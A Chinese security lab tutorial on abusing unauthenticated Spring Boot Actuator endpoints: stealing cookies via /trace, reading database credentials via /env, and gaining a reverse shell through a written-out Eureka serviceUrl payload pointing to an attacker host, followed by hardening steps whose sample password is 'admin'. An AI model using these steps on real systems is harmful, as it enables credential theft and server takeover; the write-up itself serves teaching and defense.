作者：合天网安实验室 合天智汇

## 前言  

部门大佬在某src上挖到了这个漏洞，是一个比较老的洞了，我觉得有点意思，就动手在本地搭了个环境测试一下。

Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator
开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator
启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。

如上所示，actuator 是 springboot
提供的用来对应用系统进行自省和监控的功能模块。其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：

![v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg](https://pic1.zhimg.com/v2-2b1d2a3a0ce2ec85a29c4c2fcc81459c.jpg)

## 利用思路  

  1. 利用env加refresh进行getshell  

  2. 利用mappings，寻找未授权接口  

  3. 利用trace，获取认证信息（Cookie、tooken、Session），利用认证信息访问接口。  

  4. env有可能泄露的数据库账号密码（mangodb）,当然得开放外网，可能性较小。  

  5. 老外说可以执行sql语句，目前没搞明白  

## 漏洞发现  

通常识别当前 web 应用使用的框架为 springboot 框架。主要有两个方法判断：

  1. 通过 web 应用程序网页标签的图标（favicon.ico）；如果 web 应用开发者没有修改 springboot web 应用的默认图标，那么进入应用首页后可以看到如下默认的绿色小图标：  

![v2-6755c6bf0230baac5c44f471545535c8.jpg](https://pic1.zhimg.com/v2-6755c6bf0230baac5c44f471545535c8.jpg)

  1. 通过 springboot 框架默认报错页面；如果 web 应用开发者没有修改 springboot web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下（此处仅以 404 报错页面为例）：访问一个随便构造的路径，比如：[http:/172.26.2.24:8090/index](http://10.1.1.137:8090/index)，出现如下报错页面说明web网站使用了springboot框架（在实际中遇到的大多数都是此类情况）。  

![v2-adbbbbbee4e5cc2f1dd1ef7c8a6eb499.jpg](https://pic4.zhimg.com/v2-adbbbbbee4e5cc2f1dd1ef7c8a6eb499.jpg)

综合以上两个途径来判断当前 web 应用是否是 springboot
框架，就是通过访问不同的目录，看是否有小绿叶图标，然后就是想办法在不同目录下触发应用程序的 4xx 或 5xx 错误，看是否有 Whitelabel
Error Page 报错。

## 漏洞利用  

访问/trace端点获取基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等），如果存在登录用户的操作请求，可以伪造cookie进行登录。

![v2-cb92a80d96df1d9a93c0e2f671bd22df.jpg](https://pic2.zhimg.com/v2-cb92a80d96df1d9a93c0e2f671bd22df.jpg)

访问/env端点获取全部环境属性，由于 actuator 会监控站点 mysql、mangodb
之类的数据库服务，所以通过监控信息有时可以mysql、mangodb 数据库信息，如果数据库正好开放在公网，那么造成的危害是巨大的，

![v2-6f91a51d29ddbb657826cf602cc479ee.jpg](https://pic2.zhimg.com/v2-6f91a51d29ddbb657826cf602cc479ee.jpg)

/env端点配置不当造成RCE，

前置条件：Eureka-Client <1.8.7（多见于Spring Cloud Netflix）

比如测试前台json报错泄露包名就是使用netflix

![v2-89918ae79423390b704dd970656f0816.jpg](https://pic2.zhimg.com/v2-89918ae79423390b704dd970656f0816.jpg)

需要以下两个包

spring-boot-starter-actuator（/refresh刷新配置需要）

spring-cloud-starter-netflix-eureka-client（功能依赖）

利用python3启动脚本，需要注意两个地方，一个为接收shell的ip和端口，另一个为我们脚本启动的端口，

![v2-36e957dda6e549dcb948a7dc11c960d7.jpg](https://pic1.zhimg.com/v2-36e957dda6e549dcb948a7dc11c960d7.jpg)

![v2-10dbef55bdd6d5d6f02ee66de25e2b0f.jpg](https://pic1.zhimg.com/v2-10dbef55bdd6d5d6f02ee66de25e2b0f.jpg)

Nc监听一个端口用以接收反弹shell，

写入配置，访问/env端点，抓包将get请求改为post请求，post内容为（该ip为脚本启动的机器的ip）：

eureka.client.serviceUrl.defaultZone=http://10.1.1.135:2333/xstream

![v2-bff7c46fbb599124e40f87e374e1f26d.jpg](https://pic3.zhimg.com/v2-bff7c46fbb599124e40f87e374e1f26d.jpg)

然后再访问/refresh,抓包将get请求更改为post请求，post数据随意，

![v2-4db970870349a9178aef432375222c19.jpg](https://pic2.zhimg.com/v2-4db970870349a9178aef432375222c19.jpg)

然后在我们nc的窗口可以看到成功反弹了一个shell回来。

![v2-40c4c0aba2f4288fcd805683ef0ebfde.jpg](https://pic2.zhimg.com/v2-40c4c0aba2f4288fcd805683ef0ebfde.jpg)

## 漏洞修复  

作为一名安全dog，不能只挖不修，在项目的pom.xml文件下引入spring-boot-starter-security依赖

    
    
    <dependency>
    	<groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-security</artifactId>
    </dependency>

![v2-d460ecd86c0be95e6f2bef3d4d2e9021.jpg](https://pic1.zhimg.com/v2-d460ecd86c0be95e6f2bef3d4d2e9021.jpg)

然后在application.properties中开启security功能，配置访问账号密码，重启应用即可弹出。

    
    
    management.security.enabled=true
    security.user.name=admin
    security.user.password=admin

![v2-3a2ce5a421280ce4e803d49b81f136cd.jpg](https://pic2.zhimg.com/v2-3a2ce5a421280ce4e803d49b81f136cd.jpg)

![v2-84fdf20028688ddae9747f40eae087ef.jpg](https://pic4.zhimg.com/v2-84fdf20028688ddae9747f40eae087ef.jpg)

禁用接口，则可设置如下（如禁用env接口）：

endpoints.env.enabled= false

## 问题  

老外说可以执行sql语句发现执行不了，可能方法没用对，截了个他的图，希望有执行成功的大佬分享下。

![v2-edd5535bbf1a350f90aedde205f328d0.jpg](https://pic3.zhimg.com/v2-edd5535bbf1a350f90aedde205f328d0.jpg)

实际环境中，发现很多无refresh ，导致无法执行命令目前还没突破

## 参考  

<https://www.veracode.com/blog/research/exploiting-spring-boot-actuators>

<https://www.cnblogs.com/junsec/p/12066305.html>

<https://www.freebuf.com/news/193509.html>

 **前方高能：同款实验get**

Springboot未授权访问

[http://hetianlab.com/expc.do?w=exp_ass&ec=ECID07d9-3ccd-4c90-8a09-b980d8cd7858](http://hetianlab.com/expc.do?w=exp_ass&ec=ECID07d9-3ccd-4c90-8a09-b980d8cd7858)

（Actuator 是 springboot
提供的用来对应用系统进行自省和监控的功能模块，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息从而导致信息泄露的事件发生）

  

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

